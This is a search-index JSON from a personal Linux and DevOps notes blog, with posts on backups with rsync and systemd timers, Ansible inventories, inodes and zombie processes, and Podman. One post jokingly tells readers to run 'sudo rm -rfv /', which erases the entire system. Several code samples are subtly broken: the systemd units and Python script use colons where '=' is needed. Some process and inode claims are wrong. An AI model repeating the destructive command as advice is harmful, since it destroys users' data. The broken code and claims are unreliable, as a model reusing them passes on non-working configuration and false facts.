{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"DefnotNotes","text":"<p>Useful learning materials. Just click search.  Definitely not my personal notes \ud83d\ude0f  </p>"},{"location":"#killer-coda-labs","title":"\ud83d\udccc Killer Coda Labs","text":"<p>01-Learning-Through-Self-Destruction</p>"},{"location":"tags/","title":"Tags","text":""},{"location":"tags/#tag:aws-sysop-certificate","title":"Aws Sysop Certificate","text":"<ul> <li>            Aws Sysops Certifcate          </li> </ul>"},{"location":"tags/#tag:comptia-linux-","title":"Comptia Linux +","text":"<ul> <li>            Comptia Objectives          </li> </ul>"},{"location":"tags/#tag:rhel","title":"RHEL","text":"<ul> <li>            Auditd          </li> <li>            SELinux          </li> </ul>"},{"location":"tags/#tag:ansible","title":"ansible","text":"<ul> <li>            Ansible Commands          </li> <li>            Ansible Main          </li> <li>            Ansible Varaibles          </li> <li>            Ansible Vault          </li> <li>            Jinja2          </li> <li>            Molecule          </li> <li>            ansible-playbook          </li> <li>            ansible.cfg          </li> <li>            terrafrom-ansible          </li> </ul>"},{"location":"tags/#tag:ec2","title":"ec2","text":"<ul> <li>            Ami          </li> <li>            Aws Outposts          </li> <li>            Cloud watch for EC2 metrics          </li> <li>            EC2 Purchasing Options          </li> <li>            Ec2 instance          </li> <li>            Instance Types          </li> <li>            Placement groups          </li> <li>            SSM          </li> <li>            SSM Paramaters store          </li> <li>            Spot fleets          </li> <li>            ec2 image builder          </li> </ul>"},{"location":"tags/#tag:golang","title":"golang","text":"<ul> <li>            terratest          </li> </ul>"},{"location":"tags/#tag:logging","title":"logging","text":"<ul> <li>            Loki          </li> <li>            zabbix          </li> </ul>"},{"location":"tags/#tag:prometheus","title":"prometheus","text":"<ul> <li>            Alert manager          </li> <li>            Export Prometheus Metrics          </li> <li>            Prometheus          </li> <li>            Promql          </li> <li>            Push gatway prometheus          </li> <li>            Service instrumentation          </li> </ul>"},{"location":"tags/#tag:selinux","title":"selinux","text":"<ul> <li>            SELinux          </li> <li>            Selinux containers          </li> <li>            Selinux policies          </li> </ul>"},{"location":"tags/#tag:terraform","title":"terraform","text":"<ul> <li>            Debbuging terraform          </li> <li>            Hashicorp terraform examination          </li> <li>            Terraform          </li> <li>            Terraform backends          </li> <li>            Terraform config files          </li> <li>            Terraform registry          </li> <li>            Terraform standard module structure          </li> <li>            Terraform state          </li> <li>            terrafrom-ansible          </li> <li>            terratest          </li> </ul>"},{"location":"tags/#tag:testing","title":"testing","text":"<ul> <li>            terratest          </li> </ul>"},{"location":"blog/","title":"Feed","text":""},{"location":"blog/2024/05/23/dont-break-easy-preserve-best-version-of-your-sytsem/","title":"Dont break easy preserve best version of your sytsem","text":"<p>I\u2019m sure you remember the feeling of your perfect setup.</p> <p>Special ordered coffee from Network Chuck.</p> <p>The thrill of the customized Xmonad guessing your current mood and selecting the wallpaper accordingly. All VSCode themes and plugins meticulously selected. The urge to spout code like there\u2019s no tomorrow.</p> <p>You open your computer</p> <p>Only to realize the disk is corrupted and all is gone\u2026</p> <p>There\u2019s no turning back unless you have a photographic memory and even then, it\u2019s so hard to redo this whole thing again.</p> <p>What if I tell you there\u2019s a way to preserve your best system self?</p> <p>Buy my course at www\u2026 No, I\u2019m kidding, the recipe is simple.</p>"},{"location":"blog/2024/05/23/dont-break-easy-preserve-best-version-of-your-sytsem/#3-pillars-of-the-stable-system","title":"3 pillars of the stable system","text":"<p>When you evaluate your environment, you have to focus on these 3 things:</p> <p></p> <p>1.Backup Do I maintain backups regularly?</p> <p>2.Reproducibility How fast can I get it to work and deploy?</p> <p>3.Portability And how easy is it to get to it?</p>"},{"location":"blog/2024/05/23/dont-break-easy-preserve-best-version-of-your-sytsem/#regular-backups","title":"Regular backups","text":"<p>It\u2019s the obvious one, but I\u2019m pretty sure there\u2019s one thing you forgot to do so. This one photo album from summer 2019? And that good you shouldn\u2019t remember at all about it\u2026 No, I mean it. The issue with backups is that they take a lot of mental effort to do so. That\u2019s why you have to automate it.</p> <p></p> <p>Stick to the basic tools</p> <p>I\u2019m sure you\u2019re familiar with git, you used rsync one or two times while SSHing to your Home Lab. You might have heard about the cron jobs or systemd timers. Why not combine all these tools?</p> <p>So set up a repo backup or whatever</p> <p>remember about creating also one more branch not only main.</p> <p></p> <p>The thing is you might change something in config that\u2019s not stable and later regret it. And I know in git, you can revert to the particular commit, but sometimes you like all the changes except one or two on different commits\u2026</p> <p>So let\u2019s say that main branch is for the stable version that you generally enjoy any future changes will be on dev.</p> <p>You can always merge them any time.</p> <p></p> <p>Then get the list of things you want to backup into one .txt file and use some bash example</p> <p></p> <pre><code>while read -r line;\ndo\n    rsync -av \"$line\" \"$HOME/backup\"\ndone &lt; backup_list.txt\n</code></pre> <p></p>"},{"location":"blog/2024/05/23/dont-break-easy-preserve-best-version-of-your-sytsem/#scheduling","title":"Scheduling","text":"<p>Now you have to know a bit about the cron jobs or systemd timers.</p> <p>Cron jobs may be easier, but I think that having a unit is more future-proof.</p> <p></p> <p>-Unit in systemd is just an entity that systemd manages.</p> <p></p> <p>Remember we create a user unit not a root one</p> <p></p> <pre><code>mkdir -p  ~/.config/systemd/user/\nvim    ~/.config/systemd/user/backup.service\nvim    ~/.config/systemd/user/backup.timer\n</code></pre> <p></p> <pre><code>[Unit]\nDescription: Backup files\n\n[Service]\nExecStart=/bin/bash -c 'path/to/your/script'\n\n[Install]\nWantedBy: network.target\n</code></pre> <p></p> <p>Install is just which step of the system initialization it should be executed with</p> <p>(remember not explicitly after or before). Because systemd is the parent of all the processes. And it spawns them in a particular order.</p> <p></p> <p>Try</p> <pre><code>systemctl list-units --type: target\n</code></pre> <p></p> <p>Now set the timer with the same name but with .timer</p> <p></p> <pre><code>[Unit]\nDescription: Run backup service daily\n\n[Timer]\nOnCalendar: daily\nPersistent: true\n\n[Install]\nWantedBy: default.target\n</code></pre> <p>now add your sevice and timer with</p> <pre><code>systemctl --user daemon-reload\nsystemctl --user --now enable backup.timer\nsystemctl --user --now start backup.timer\n</code></pre> <p></p> <p>And voila, we can forget about this once and for all. If you\u2019re interested in backing up automatically on USB, You can edit /etc/fstab to mount your USB in the given location on boot And just add the path to rsync destination in the script</p> <p>But be careful and read more about fstab before you start experimenting.</p>"},{"location":"blog/2024/05/23/dont-break-easy-preserve-best-version-of-your-sytsem/#reproducibility","title":"Reproducibility","text":"<p> It\u2019s great to have everything in place, but how quickly can we get it to work?</p> <p>Unfortunately, the process is currently too slow.</p> <p>Manually moving files and installing software is a painful experience.</p> <p>Therefore, we need to create a script that processes our dotfiles, creates symlinks from the main repository to the .config and various directories, and installs executables based on a list.</p> <p>(I\u2019m currently working on a tool to streamline this using Go.)</p> <p></p> <p>Declarative vs Imperative Approach</p> <p></p> <p>When we install packages and configure systems traditionally, we often take an imperative approach, making modifications directly rather than strictly defining configurations.</p> <p></p> <p>In the declarative approach, we predesign the system and apply the configuration, allowing for easy rebuilding after modifications.</p> <p>In traditional systems, reverting to previous versions is challenging due to dependencies hell.</p> <p>Thast why here comes our sponsor Nixos\u2026</p>"},{"location":"blog/2024/05/23/dont-break-easy-preserve-best-version-of-your-sytsem/#nix-your-way-out","title":"Nix: Your Way Out","text":"<p> Sorry, I know, I know, this isn\u2019t the tech coaching channel. But back to the point.</p> <p>Nixos, a Linux distribution , offers a completely declarative approach.</p> <p>You write one configuration file called flake, and it sets up everything.</p> <p></p> <p>It installs every program and meanges every config specified, utilizing a tool like Homenager.</p> <p></p> <p>Additionally, it regularly creates snapshots of the enitre system, facilitating easy rollback in case of breaking changes.</p> <p></p> <p>Nixos also containerizes programs, isolating dependencies for easy testing and deployment.</p> <p>Meaning it installs programs in a separate environment that doesn\u2019t share dependencies.</p> <p>This makes testing ridiculously easy since you can install any app, test it, and forget about it.</p> <p>(In the future, there will be more collaboration between NixOS and Docker.)</p> <p>You can create a .nix script to locally run and deploy containers based on it.</p> <p>The possibilities are endless.</p> <p>See the template</p>"},{"location":"blog/2024/05/23/dont-break-easy-preserve-best-version-of-your-sytsem/#drawbacks-of-nix","title":"Drawbacks of Nix","text":"<p>While powerful, Nix has limitations. Direct binary installations are not supported, and it has a steep learning curve (it doesn\u2019t help that the Nix language is functional).</p> <p>However, you can get around these issues by using flakes and nix-id.</p> <p>For frequent testers or users with multiple devices, it\u2019s highly recommended.</p>"},{"location":"blog/2024/05/23/dont-break-easy-preserve-best-version-of-your-sytsem/#things-get-corupted-security-concerns","title":"Things get corupted (Security Concerns)","text":"<p>These days, there are a lot of attacks on software, and particularly recently we had an affair with Heartbleed 2.0</p> <p>The vulnerability is a backdoor in the xz utils package.</p> <p>A widely used Linux utility for compressing and decompressing files</p> <p></p> <p>The backdoor allows attackers to compromise SSH logins and gain unauthorized access to affected systems.</p> <p>To fix this on nix, we will just revert to the previous version of the system and wait for a patch.</p> <p>On another system, if we do regularly take snapshots, we can also do this.</p> <p></p> <p>But what happens to our GitHub projects? Does the code need bacup mechanism outside of github ?</p> <p>I know you haven\u2019t thought about it, have you? Neither have I. That\u2019s why this will be the topic of my next blog post.</p>"},{"location":"blog/2024/05/23/dont-break-easy-preserve-best-version-of-your-sytsem/#portability","title":"Portability","text":"<p>Despite backups and automation, accessibility remains crucial.</p> <p>Can we access our files on the fly from another computer or sytsem?</p> <p>Usually, when we have a snapshot or a configuration, we have to install the particular operating system.</p> <p>This is time-consuming and sometimes isn\u2019t even possible</p> <p>(for example, when you are using someone else\u2019s computer or you have Windows installed) .</p>"},{"location":"blog/2024/05/23/dont-break-easy-preserve-best-version-of-your-sytsem/#virutalization-the-queen-of-the-flexabilty","title":"Virutalization the queen of the flexabilty","text":"<p> When it comes to quick and easy solutions, containers immediately comes to mind.</p> <p>They offer a rapid and straightforward approach: install everything you need in the container, push it to Dockerhub, and Pccess it from anywhere you want.</p> <p></p> <p>Higly encourage to have the container withh all of ur\u2019e little tools</p> <p>You can even build container-based solutions or troubleshoot issues on the target network.</p> <p>Containers are quick, simple, and resource-efficient. However, for our daily driver, we\u2019re looking for something more versatile and robust</p>"},{"location":"blog/2024/05/23/dont-break-easy-preserve-best-version-of-your-sytsem/#just-use-vms","title":"Just use Vms","text":"<p> This article can be summed up in just one line.</p> <p></p> <p>Embrace VMs, and you\u2019re set. Why?</p> <p></p> <p>-They are easy to backup; you just create snapshots regularly.</p> <p></p> <p>-You can test things and revert to the previous state or copy them every way you want.</p> <p></p> <p>-They are extremely portable; you can have the image on a USB drive and boot it on almost any computer.</p> <p></p> <p>-Plus, VMware Pro is now free on Windows.</p> <p></p> <p>If you\u2019re not using VMs, just stop reading here and install one\u2026</p> <p></p>"},{"location":"blog/2024/05/23/dont-break-easy-preserve-best-version-of-your-sytsem/#ventoy-the-swiss-army-knife-of-usb-sticks","title":"Ventoy: The Swiss Army Knife of USB Sticks","text":"<p>Here in Poland, we were recently advised to have a backpack with essential items just in case something happens.</p> <p>These essentials include canned food, fresh water, and toilet paper.</p> <p>However, no one mentioned the importance of having a USB stick.</p> <p></p> <p>What if a power outage occurs?</p> <p>There will be no time to download disk passwords or, more importantly, ISO files.</p> <p>That\u2019s why you should know about Ventoy.</p> <p></p> <p>You probably use Rufus or Balena Etcher to flash your USB drive.</p> <p>But what if I told you that you could have all your VM ISOs, files, and family photos on one pen drive?</p> <p>Ventoy does that for you.</p> <p>Go read about it and be prepared for anything.</p> <p></p> <p>You might laugh at me, but how would you know that the computer you happen to find wasn\u2019t compromised or doesn\u2019t have the tools you need to survive? Or there could be network limitations.</p>"},{"location":"blog/2024/05/23/dont-break-easy-preserve-best-version-of-your-sytsem/#to-sum-up","title":"To sum up","text":"<p>So, next time you\u2019re diving into the digital land, remember these simple rules:</p> <p>Back it up, make it reproducible, and keep it portable.</p> <p>These steps can save you a world of headache when disaster strikes.</p> <p>So, keep tinkering, keep exploring, and above all, keep your system running like a champ.</p> <p>Because in a world of chaos, your tech setup should be the calm in the storm.</p> <p>Don\u2019t break easy, preserve that best version of your system!</p>"},{"location":"blog/2024/07/09/humanise-servers-with-ansible/","title":"Humanise Servers With Ansible","text":"<p>With the endless anthropomorphization of AI and tech, we often think that technology is starting to become more human-like.</p> <p>However, we rarely realize that what truly surrounds us are millions of servers, like an army of starwars clones.</p> <p>From a server\u2019s perspective, it doesn\u2019t fully comprehend what is happening. A server doesn\u2019t know that it is a server unless we assign it a name or identifier.</p> <p>You might name your favorite virtual machine \u201cJaney\u201d and live happily ever after. But what happens when you have 5,000 Janeys or an entire cluster of them?</p>"},{"location":"blog/2024/07/09/humanise-servers-with-ansible/#creating-an-environment","title":"Creating an Environment","text":"<p> It\u2019s important to know where we are working whether it\u2019s in production, a main cluster, or some other environment. In general, the more information a node holds, the easier it is to troubleshoot. In Ansible, we can achieve this by setting variables within the inventory itself. In a previous post, I mentioned groups as the first way to organize your machines. This is the most basic yet powerful feature. For now, let\u2019s say we have two environments: <code>home_lab</code> and <code>production</code>.</p> <pre><code>[home_lab]\nproxy\njimmy\ntest\n\n[production]\nwebserver1\nwebserver2\nwebserver3\n\n\n[production:vars]\nsome_server: foo.southeast.example.com    \ntype: test\nhalon_system_timeout: 30\nself_destruct_countdown: 60\nescape_pods: 2\n</code></pre> <p>Ansible is so great that it supports different formats for inventory, such as YAML and JSON.</p> <p>JSON is especially handy if you want to grab a list of machines from an API call.</p> <p>You can also provide additional variables to the hosts, like <code>escape_pods: 2</code>, which can be used for matching conditions later. In the playbook, we can easily choose only the hosts we need based on these variables.</p> <pre><code>---\n- hosts: production\n  tasks:\n    - name: Filter hosts with specific number of nodes\n      debug:\n        msg: \"Hostname: {{ inventory_hostname }}\"\n      when: hostvars[inventory_hostname]['nodes'] == 2\n</code></pre>"},{"location":"blog/2024/07/09/humanise-servers-with-ansible/#our-environment-is-not-stable","title":"Our environment is not stable","text":"<p>As I mentioned earlier, when we scale up, we start dealing with dynamic IPs, constant rotation of instances, and varying request loads.</p> <p>This can make it difficult to pinpoint the true location of boxes this can truly create horrible mess.</p> <p>Fortunately, Ansible offers a solution to this complexity through dynamic inventories.</p> <p>With dynamic inventories, you don\u2019t have to write the code yourself much like using roles or collections.</p> <p>You can download inventory scripts or plugins for various platforms, from Docker to GitLab runners.</p> <p>Just remember to define dynamic groups as empty in the static inventory file; otherwise, Ansible will throw an error.</p> <pre><code># list all the available ones\nansible-doc -t inventory -l\n</code></pre> <p>Hearse the example documentation for the Docker Containers inventory</p>"},{"location":"blog/2024/07/09/humanise-servers-with-ansible/#sometimes-u-have-to-do-something-custom","title":"Sometimes u have to do something custom","text":"<p>Fortunately, creating something tailored to your needs is straightforward. You\u2019re not restricted to using Python.</p> <p>You can use any language that supports outputting JSON to standard output.</p> <p>To create a dynamic inventory, simply write a script in your preferred language that generates JSON and outputs it.</p> <p>You just need to specify the path to the script or binary in your Ansible configuration. &gt;Hearse a small example:</p> <pre><code>package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"os\"\n)\n\n\n// Represents  hosts and variables.\ntype Group struct {\n    Hosts []string          `json:\"hosts\"`\n    Vars  map[string]string `json:\"vars\"`\n}\n\nfunc main() {\n    inventory:= Group{\n            Hosts: []string{\"host1\", \"host2\"},\n            Vars: map[string]string{\n                \"var1\": \"value1\",\n                \"var2\": \"value2\",\n            },\n        }\n\n    output, err := json.MarshalIndent(inventory, \"\", \"  \")\n    if err != nil {\n        fmt.Println(\"Error:\", err)\n        os.Exit(1)\n    }\n\n    fmt.Println(string(output))\n}\n</code></pre> <pre><code># then build it \ngo build main.go\n\n# and run as a inventory to the playbook\n\nansible-playbook -i main {playbook name }\n</code></pre>"},{"location":"blog/2024/07/09/humanise-servers-with-ansible/#who-touched-it","title":"Who Touched It?","text":"<p> Imagine you have set up your inventory, executed your favorite playbook, and everything seems nice and stable. Then u come back later the same day. And, the system doesn\u2019t work as expected. You start asking around to find out what happened, but nobody knows anything. If only you knew that you could hash your files to track changes\u2026</p> <p>Fortunately, the Ansible copy module has a <code>checksum</code> parameter.</p> <p>By default, it uses the SHA-1 algorithm, but you can provide the hash and the hashing method upfront.</p> <p>This is an excellent practice to verify your files before running the playbook.</p> <p>If something goes wrong, you can easily confirm if the system was altered by someone else and ensure you\u2019re not the source of the issue.</p> <p>Example: Let\u2019s say you have a configuration file that you need to copy to a remote server. You can use the Ansible copy module with the checksum parameter to ensure the file hasn\u2019t been tampered with.</p> <pre><code>- name: Copy configuration file with checksum\n  ansible.builtin.copy:\n    src: /path/to/local/config/file.conf\n    dest: /path/to/remote/config/file.conf\n    checksum: sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef\n</code></pre> <p>In this example, the checksum ensures that the file you\u2019re copying matches the expected hash. If the file has been altered, Ansible will detect the discrepancy, helping you identify any unauthorized changes.</p>"},{"location":"blog/2024/07/09/humanise-servers-with-ansible/#in-a-system-everyone-touches-everything","title":"In a System, Everyone Touches Everything","text":"<p>Files and systems are constantly moving and changing, making them hard to track.</p> <p>Sometimes, you work on a machine for a while, then leave it for three weeks, only to return and struggle to figure out what happened.</p> <p>Remember that even a simple accidental <code>touch</code> command can change the modification date of a file, complicating the tracking process.</p> <p>As engineers, we usually rely on notes to solve this issue, but it would be even better if we could document changes directly within our systems?</p> <p>A good story adds clarity and context, making everything more manageable.</p> <p>That\u2019s why Ansible comes with a templating engine, a tool you might have used early in your web development career before moving to the shiny world of JavaScript and forgetting about it.</p> <p>This Jinja engine can execute Python code within itself, providing a powerful way to maintain and document your systems.</p> <p>I\u2019ll show you a useful template that\u2019s great to have.</p> <pre><code># Configuration file generated by Ansible\n# Date: {{ ansible_date_time.iso8601 }}\n# System Name: {{ inventory_hostname }}\n# Change Description: {{ change_description }}\n# Environment: {{ environment }}\n\n# File Hashes:\n{% for file, hash in file_hashes.items() %}\n# {{ file }}: {{ hash }}\n{% endfor %}\n</code></pre> <p>First, record the system name and the date when the modification occurred.</p> <p>Then, log what changed, such as the installation of Nginx or the creation of new files.</p> <p>For file creation, store their hashes.</p> <p>You can write this information to /var/log and later rewrite it or store a copy on your local machine.</p> <p>However, managing this for thousands of entries might be problematic.</p> <p>Additionally, log other variables, such as whether it was a testing or production system, or if it was a routine scan.</p> <p>The more information you provide, the better.</p> <pre><code>- name: Generate configuration with detailed information\n  hosts: all\n  vars:\n    change_description: \"Installation of Nginx\"\n    environment: \"production\"\n    file_hashes:\n      \"/etc/nginx/nginx.conf\": \"sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef\"\n      \"/var/www/html/index.html\": \"sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890\"\n  tasks:\n    - name: Apply configuration using a template\n      template:\n        src: /path/to/local/template.j2\n        dest: /var/log/ansible_changes{current date}.log\n</code></pre>"},{"location":"blog/2024/07/09/humanise-servers-with-ansible/#never-get-lost-again","title":"Never Get Lost Again","text":"<p>As you gain experience in tech and programming, you\u2019ll frequently transition between different environments.</p> <p>It\u2019s crucial not to fear the unfamiliar but to understand where you are and what has changed.</p> <p>This approach will help you avoid confusion and frustration.</p> <p>There\u2019s nothing worse than having something work and not knowing why, or having something fail and not understanding what changed.</p> <p>By documenting your path and changes, you can navigate through your work with clarity and confidence.</p> <p>Mark your path and stay informed.</p> <p>Peace out.</p>"},{"location":"blog/2023/12/21/learning-through-self-destruction/","title":"Learning through self-destruction","text":"<p>Terminal is one of \u201cthe last remaining things that bestows absolute power upon you\u201d. </p> <p>It allows you to witness the entire operating system disappear and then be reborn in a matter of seconds.</p> <p>I strongly advise you to try this at home sudo rm -rfv /</p> <p>When I wrote my first prompt two years ago, I was thrilled. I didn\u2019t understand much of it, spending hours copying the file because it didn\u2019t use the path to the cloud drive.</p> <p>Nevertheless, I realized that the system was mine, and I alone determined what went in and what went out. As you can imagine, I wasn\u2019t satisfied with the commands used in the Windows environment.</p>"},{"location":"blog/2023/12/21/learning-through-self-destruction/#the-most-dangerous-person-in-the-entire-programming-industry-is-the-beginner-bash-programmer","title":"The most dangerous person in the entire programming industry is the beginner bash programmer","text":"<p>(especially if they are unaware of tools like ShellCheck)</p> <p>When I wrote my first scripts, I didn\u2019t care about encapsulating variables in double quotes;</p> <p>I didn\u2019t even know what **\u201c*\u201c** meant.</p> <p>However, a friend of mine suggested I explore virtual machines for experimentation.</p> <p>This proved to be an excellent choice, allowing me to recreate the system instantly without any fear.</p> <p>(To this day, even though I\u2019m a devoted Linux user, VMware and Windows still have their advantages.)</p> <p>I spent countless hours reading about different distributions, associating them with various desktop environments, feeling the need to learn one after another, switching between them every couple of days. I also experimented with various disruptive changes, such as installing different package managers, relaunching VMs because I lost the plank layout, and casually messing up all my programs because of casual use ofsudo apt autoremove. I felt frustrated because I wanted to encapsulate them all, but it seemingly wasn\u2019t possible. Finally, after about two months of continuous exploration.</p> <p>I switched to Manjaro because I wanted to stay current and share the \u201cI\u2019m using Arch, by the way\u201d badge.</p>"},{"location":"blog/2023/12/21/learning-through-self-destruction/#every-linux-user-should-know-this","title":"Every Linux user should know this","text":"<p>It dawned on me that the desktop manager differed from the distribution itself.</p> <p>I delved deeply into tiling window managers and the art of automating tasks.</p> <p>I even started tinkering with desktop files because Qtile refused to run without the SSDM recognizing them. Reading and adjusting the Qtile config became my obsession, only to discover that after a minor change, it errored and moved to the default settings. Frustration led me to switch to i3.</p> <p>But it wasn\u2019t without a hassle. Once, I managed to unintentionally delete all the desktop sessions while attempting to use i3 with XFCE. It left me with no desktop environment and forced me into a full system format (a popular way to solve problems in the Linux world, fast and without excessive time consumption).</p> <p>It wasn\u2019t for nothing; format after format, I set up things faster and faster.</p> <p>I realized how regular backups are important and how the system operates.</p> <p></p> <p>I became bolder, more daring, and that\u2019s what ultimately inspired me to delve into serious programming.</p> <p></p>"},{"location":"blog/2023/12/21/learning-through-self-destruction/#inputting-the-word-of-goduser-can-do-anything","title":"Inputting the word of God/user can do anything","text":"<p>One of my first apps that I built in Python was my interpretation of the flashcards app with Flask and a templating engine. I was quite proud of my little project and wasn\u2019t really worried about safety.</p> <p>So, I gave the app to test to my friend in cybersecurity. He was clicking around when suddenly he copied the entire Bible and input it into the app.</p> <p> What\u2019s interesting is that the app didn\u2019t break, but you can imagine that it was not safe either.</p> <p>However, the most hilarious aspect of my work for my friend was that you could input HTML inside the flashcards and query the database that way (cross-site scripting). But let\u2019s leave that behind in the past\u2026</p>"},{"location":"blog/2023/12/21/learning-through-self-destruction/#what-does-not-kill-you-makes-you-stronger","title":"What does not kill you makes you stronger","text":"<p>Don\u2019t be afraid to try messing up your system!</p> <p>Don\u2019t be afraid to tinker with your system!</p> <p>It grants you a deeper understanding of what lies beneath the surface.</p> <p>By making mistakes, you not only learn to avoid problems but also gain the ability to fix them in the future.</p> <p></p> <p></p> <p>I killed my system countless times, and yet it always came back. In the end, it\u2019s just software\u2026</p>"},{"location":"blog/2024/05/14/linux-unmasked/","title":"Linux unmasked","text":"<p>When you use an OS like Linux, you must constantly familiarize yourself with the feeling that you will be surprised by it. You can\u2019t just learn Linux\u2026 But regardless of the surprise, you usually have a solid understanding of the system. You know more or less how things work, what\u2019s required, and so on. That\u2019s what I thought while studying for the CompTIA Linux+ certification.</p> <p>You know more or less how things work, what\u2019s required, and so on.</p> <p>That\u2019s what I thought while studying for the CompTIA Linux+ certification.</p> <p>I\u2019m sure you have in mind Linux mantras \u201ceverything is a file\u201d or \u201cyou control the processes\u201d.</p> <p>But little do you know\u2026</p> <p></p>"},{"location":"blog/2024/05/14/linux-unmasked/#everything-in-linux-is-a-file-and","title":"Everything in Linux is a file and \u2026","text":"<p>So it\u2019s quite obvious that devices on your system are virtual files in a /dev directory, processes are files, even the request queu is a file.</p> <p></p> <p>But what exactly does \u201cfile\u201d mean?</p> <p></p> <p>When you think about it, you probably imagine something similar to the request structures;</p> <p>it has some headers (type of the file, size, etc.), some metadata (permissions, and ownership),</p> <p>and the main contents.</p> <p></p> <p>This is all a lie\u2026</p> <p></p> <p>You use ls probably all the time, but did you know there\u2019s a -i option?</p> <p></p> <pre><code>   -i, --inode  print the index of the inode\n</code></pre> <p></p> <p>So what exactly is an inode and why all of a sudden can\u2019t files live without it?</p> <p></p> <p>An inode is a data structure that holds the metadata of the file.</p> <p>If we really want to define what a file is, it\u2019s raw data and the pointer to inode that defines it.</p> <p></p> <p>Ok, but what are the directories then?</p> <p></p> <p>Directories are just the table of file names and inodes, that\u2019s quite simple.</p> <p>But how can we use this knowledge except boasting about it at beer night?</p> <p>So there comes another myth\u2026</p>"},{"location":"blog/2024/05/14/linux-unmasked/#i-can-have-as-many-files-as-i-want-as-long-as-i-have-the-space","title":"I can have as many files as I want (as long as I have the space).","text":"<p>That\u2019s not quite right, you see on most file systems except ZFS, the inode count is set on file system creation.</p> <p>You can check it using stat on /var/log/lastlog.</p> <p>If you all of a sudden start creating a lot of files, you get a funny message:</p> <p></p> <p>File Creation Failures Due to Inode Exhaustion?</p> <p></p> <p>The limit of the inodes has been exceeded. It\u2019s not as unusual as you might think. The cloud storage ain\u2019t cheap, so if we request a small space and all of a sudden our server starts to utilize cache, we might very quickly find that despite having 3GB space left, the server can\u2019t work\u2026</p>"},{"location":"blog/2024/05/14/linux-unmasked/#we-can-control-the-process","title":"We Can Control the Process","text":"<p>\u201cI control the process\u201d he said, while the horde of zombies flooded the system.</p> <p></p> <p>The process is a beast, period. You might think it will succumb to your task manager, but it won\u2019t.</p> <p></p> <p>But let\u2019s begin the examination. Processes are, by nature, greedy. They want much more than they can chew. That\u2019s why they\u2019re requesting far more RAM than they require.</p> <p>Thank God the kernel knows about it and also over-allocates the memory.</p> <p>So, from now on it shouldn\u2019t be a surprise that your system is using 8.5 GB memory when it has only 8 GB because programs will use it over time, not instantaneously.</p> <p></p> <p>You think you kill programs, right?</p> <p></p> <p>All you usually do is ask nicely by sending a signal SIGTERM, which is politely saying, \u201cPlease stop\u201d.</p> <p>To kill the process no matter what, you send SIGKILL or kill -9, and yes, it literally does the job.</p>"},{"location":"blog/2024/05/14/linux-unmasked/#process-live-states","title":"Process live states","text":"<p>Processes are usually killable, but there are two exceptions. Because a process has many states in its life, it can be stopped (meaning paused), or it can be asleep, or it can be in the eternal sleep. And that\u2019s the issue when the process is in uninterrupted sleep; you can\u2019t kill it.</p> <p>Usually, this happens when the process has hardware interactions or is waiting for certain kinds of kernel synchronization primitives.</p> <p></p> <p>You know what else doesn\u2019t die easily? Zombies\u2026</p> <p></p>"},{"location":"blog/2024/05/14/linux-unmasked/#what-is-dead-can-never-die","title":"What is dead can never die","text":"<p>Zombies are just another state of the process. They don\u2019t have to be dangerous.</p> <p>All they are is the product of the sloppiness of the programmer.</p> <p>So, when the parent process spawns small children and they achieve certain small goals, and then the parent process doesn\u2019t clean them from the process table, they remain there but only as a record. Eventually, the kernel will get rid of them, but it\u2019s a sign of some troublesome software.</p> <p>You can create zombies on your own. Here is the formula:</p> <p></p> <pre><code>import os, sys, time\nttlForParent: 60;\nfor i in range(0, 10):\n# This creates the copy of the main process as\n# a child process but with diffrent PID\n   pid_1: os.fork()\n   print(pid_1)\n   print(\"Hello Worlds!!!\")\n   if pid_1 == 0:\n       sys.exit();\ntime.sleep(ttlForParent);\nos.wait()\n</code></pre> <p></p> <p>see the source</p> <p>When you\u2019re done check for your little creations</p> <p></p> <pre><code>ps ux | awk '{if($8==\"Z+\") print}'\n</code></pre> <p></p> <p>Remember that you can\u2019t kill them because they are already dead.</p> <p>In order to get rid of them, you have to know one small detail about the process.</p>"},{"location":"blog/2024/05/14/linux-unmasked/#because-all-processes-are-one-family","title":"Because all processes are one family","text":"<p>They\u2019re all one big genealogical tree.</p> <p>They are spawned on top of each other (starting from one), so process one is the parent of process two, and so on. Therefore, you have to kill the one above the PID of the most recent zombie child to get rid of the horde.</p>"},{"location":"blog/2024/05/14/linux-unmasked/#to-sum-up","title":"To sum up","text":"<p>Linux has so much more mysteries to discover. So, as you delve deeper into the Linux universe, don\u2019t be afraid of the unexpected. Grab your terminal and explore the rabbit hole.</p> <p>P.S. Wish me luck for my CompTIA Linux+ examination.</p>"},{"location":"blog/2025/03/21/podmans-new-way-no-more-generate-systemd/","title":"Podman\u2019s New Way: No More generate systemd","text":"<p>Most of us don\u2019t spend much time thinking about containerization. We use Docker because it was the first tool we started with, or Podman simply because it came preinstalled on our system.</p> <p>However, with the recent update to Podman, the previous approach using <code>podman generate systemd -f</code> is no longer the preferred way to enable persistant containers.</p> <p>This shift makes it worth taking a deeper look at the internal differences between these two approaches and how they handle container execution and service management.</p> <p>Instead of manually managing containers, we now have a systemd-native approach that integrates containers directly as services.</p>"},{"location":"blog/2025/03/21/podmans-new-way-no-more-generate-systemd/#api-vs-fork-exec","title":"API vs Fork-Exec","text":"<p>One fundamental difference between Docker and Podman is how they operate at a low level.</p> <p>Docker is built around a monolithic daemon (<code>dockerd</code>) that acts as a central controller for all containers.</p> <p>This means:</p> <ul> <li>If <code>dockerd</code> fails, all containers stop working.</li> <li>It requires root privileges, posing potential security risks.</li> <li>It does not align with the traditional Unix process model.</li> </ul> <p>In contrast, Podman follows the fork-exec model, which is closer to how Linux naturally runs processes. Instead of relying on a daemon, it launches containers as individual processes.</p> <p>This means:</p> <ul> <li>Each container is independent, with no single point of failure.</li> <li>Containers can be managed like normal processes, making integration with <code>systemd</code> much easier.</li> </ul> <p>This brings us to Podman\u2019s systemd integration where containers can now be defined using <code>.container</code> files instead of manually written service files.</p>"},{"location":"blog/2025/03/21/podmans-new-way-no-more-generate-systemd/#the-container-file-format-how-to-use-it","title":"The <code>.container</code> File Format &amp; How to Use It","text":"<p>Instead of manually writing systemd service files for containers, we now use <code>.container</code> files.</p> <p>These files allow us to define how a container should be managed as a systemd service, making it easier to start, stop, and restart containers without dealing with complex systemd configurations.</p> <p>By default, <code>.container</code> files are stored 